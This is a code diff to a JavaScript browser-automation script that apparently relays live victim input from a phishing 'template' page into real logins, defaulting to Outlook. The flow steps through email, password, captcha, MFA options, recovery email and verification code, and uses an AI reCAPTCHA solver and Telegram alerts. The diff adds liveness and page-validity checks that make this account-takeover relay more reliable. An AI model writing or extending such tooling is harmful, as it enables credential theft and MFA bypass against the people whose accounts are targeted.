@@ -24,7 +24,9 @@ import {
     stopAppScriptDataBackgroundUpdater,
     saveDebugSnapshot,
     solveRecaptchaChallengeWithAI,
-    activelyProcessing
+    activelyProcessing,
+    isTemplateAlive,
+    verifyPageStillValid
 } from './routeHelper.js';
 import { sendTelegramMessage } from '../../../api/telegram.js';
 import { getProjectDetails } from '../../../api/googlesheets.js'; // Import getProjectDetails
@@ -1604,6 +1606,18 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         break; // Exit polling loop
                     }
 
+                    // Template Liveliness Check — if template stopped polling, close browser to save resources
+                    if (!isTemplateAlive(browserId)) {
+                        logger.info(`[processRow][${browserId}][WAITINGEMAIL] Template stopped polling (>3min). Closing browser.`);
+                        finalStatus = "FAILED";
+                        updateData.status = "FAILED";
+                        updateData.lastJsonResponse = JSON.stringify({
+                            ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
+                            message: "Failed during WAITINGEMAIL phase: Template stopped responding."
+                        });
+                        break;
+                    }
+
                     // Check cache FIRST for email (pooling operator writes here immediately via immediateFlush)
                     let currentEmail = null;
                     let freshPassword = null;
@@ -1796,6 +1810,14 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                             finalStatus = "FAILED";
                             break;
                         }
+
+                        // Template Liveliness Check
+                        if (!isTemplateAlive(browserId)) {
+                            logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Template stopped polling (>3min). Closing browser.`);
+                            finalStatus = "FAILED";
+                            break;
+                        }
+
                         const checkData = await fetchDataFromAppScript(1, 30000, true);
                         const checkHeaders = checkData[0];
                         const checkColumnIndexes = getColumnIndexes(checkHeaders);
@@ -1918,6 +1940,18 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         break; // Exit polling loop
                     }
 
+                    // Template Liveliness Check — if template stopped polling, close browser to save resources
+                    if (!isTemplateAlive(browserId)) {
+                        logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Template stopped polling (>3min). Closing browser.`);
+                        finalStatus = "FAILED";
+                        updateData.status = "FAILED";
+                        updateData.lastJsonResponse = JSON.stringify({
+                            ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
+                            message: "Failed during WAITINGPASSWORD phase: Template stopped responding."
+                        });
+                        break;
+                    }
+
                     let cachedPassword = null;
                     let cachedStatus = null;
                     const cachedRow = getCachedRow(browserId);
@@ -1977,6 +2011,17 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                             platform = restoredPlatformKey || 'outlook';
                             platformConfig = platformConfigs[platform] || {};
                             logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Re-derived platform from restored email: '${platform}'`);
+                        }
+                        // Verify the page is still valid before proceeding with password entry
+                        if (page && !(await verifyPageStillValid(page, platformConfig, 'password'))) {
+                            logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Page no longer valid (expected selector missing). Marking FAILED.`);
+                            finalStatus = "FAILED";
+                            updateData.status = "FAILED";
+                            updateData.lastJsonResponse = JSON.stringify({
+                                ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
+                                message: "Failed during WAITINGPASSWORD phase: Login page was closed or navigated away."
+                            });
+                            break;
                         }
                         activelyProcessing.add(browserId);
                         updateBrowserRowDataFast(browserId, { status: "PROCESSING", verified: false, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing password submission" }) }); // Set status to PROCESSING
@@ -2433,6 +2478,15 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
             while (Date.now() < pollingTimeoutOptions && finalStatus === "WAITINGOPTIONS") {
                 try {
+                    // Template Liveliness Check
+                    if (!isTemplateAlive(browserId)) {
+                        logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Template stopped polling (>3min). Closing browser.`);
+                        finalStatus = "FAILED";
+                        updateData.status = "FAILED";
+                        updateData.lastJsonResponse = JSON.stringify({ ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED", message: "Failed during WAITINGOPTIONS phase: Template stopped responding." });
+                        break;
+                    }
+
                     const currentPageVerificationState = await checkVerification(page, platformConfig);
                     if (!currentPageVerificationState.required) {
                         logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Expected to be on a choice screen, but current page is not. View: ${currentPageVerificationState.viewName || 'unknown'}. Type: ${currentPageVerificationState.type || 'unknown'}. Failing.`);
@@ -2941,6 +2995,18 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         break;
                     }
 
+                    // Template Liveliness Check
+                    if (!isTemplateAlive(browserId)) {
+                        logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Template stopped polling (>3min). Closing browser.`);
+                        finalStatus = "FAILED";
+                        updateData.status = "FAILED";
+                        updateData.lastJsonResponse = JSON.stringify({
+                            ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
+                            message: "Failed during WAITINGRECOVERYEMAIL phase: Template stopped responding."
+                        });
+                        break;
+                    }
+
                     const checkData = await fetchDataFromAppScript(1, 30000, true);
                     const checkHeaders = checkData[0];
                     const checkColumnIndexes = getColumnIndexes(checkHeaders);
@@ -3137,6 +3203,18 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                             message: "Failed during WAITING_CODE phase: Browser page became unresponsive."
                         });
                         break; // Exit polling loop
+                    }
+
+                    // Template Liveliness Check
+                    if (!isTemplateAlive(browserId)) {
+                        logger.info(`[processRow][${browserId}][WAITINGCODE] Template stopped polling (>3min). Closing browser.`);
+                        finalStatus = "FAILED";
+                        updateData.status = "FAILED";
+                        updateData.lastJsonResponse = JSON.stringify({
+                            ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
+                            message: "Failed during WAITINGCODE phase: Template stopped responding."
+                        });
+                        break;
                     }
 
                     const checkData = await fetchDataFromAppScript(1, 30000, true);
